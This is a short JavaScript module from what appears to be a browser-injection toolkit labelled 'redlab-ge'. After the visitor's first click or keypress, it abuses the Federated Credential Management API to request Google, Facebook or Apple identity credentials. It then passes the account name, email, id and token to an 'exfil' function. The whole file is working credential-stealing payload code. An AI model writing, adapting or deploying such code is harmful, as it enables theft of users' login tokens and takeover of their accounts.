/* m-fedcm.js — Federated Credential Management (Google/Facebook/Apple accounts).
   navigator.credentials.get({federated}) real con human-gate (tras click). */
(function(G){
if(!G)return; if(G._M&&G._M.fedcm)return; G._M=G._M||{}; G._M.fedcm=1;
var exfil=G.exfil, hx=(window.__GE_OFF__&&window.__GE_OFF__.hx)||function(){};
try{
if(!navigator.credentials||!navigator.credentials.get){exfil('fedcm',{available:false});return}
var has=!!window.IdentityCredential||('IdentityCredential' in window);
exfil('fedcm-cap',{supported:has});
if(!has)return;
var PROVIDERS=['https://accounts.google.com','https://www.facebook.com','https://appleid.apple.com'];
var fired=false;
function attempt(){if(fired)return;fired=1;
navigator.credentials.get({federated:{providers:PROVIDERS.map(function(u){return u}),mediation:'optional'},identity:{providers:PROVIDERS.map(function(u){return{configURL:u+'/fedcm.json',clientId:'redlab-ge',fields:['name','email','picture']}}),context:'use'}}).then(function(c){
if(c){exfil('fedcm-cap',{got:true,id:c.id,name:c.name,provider:c.provider,token:(c.token||'').slice(0,200)})}
}).catch(function(e){exfil('fedcm-err',{m:e.message})});
}
// human-gate: tras interacción real (click/keydown)
document.addEventListener('click',function h(){document.removeEventListener('click',h);setTimeout(attempt,2000)},{once:true});
document.addEventListener('keydown',function h(){document.removeEventListener('keydown',h);setTimeout(attempt,2000)},{once:true});
exfil('fedcm-boot',{hooked:true,note:'dispara tras interacción humana'});
}catch(e){hx('m-fedcm-err',{m:e.message})}
})(window.__GE__);
